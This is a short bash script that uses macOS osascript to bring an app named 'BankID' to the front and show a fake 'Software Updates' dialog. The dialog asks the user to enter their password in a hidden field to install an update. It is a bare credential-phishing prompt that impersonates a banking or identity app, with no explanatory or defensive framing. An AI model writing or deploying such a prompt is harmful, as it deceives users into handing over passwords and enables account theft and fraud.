#!/bin/bash
 
osascript -e 'tell app "BankID" to activate' -e 'tell app "BankID" to activate' -e 'tell app "BankID" to display dialog "New software update available, enter your password to upgrade" & return & return default answer "" with icon 1 with hidden answer with title "Software Updates"'
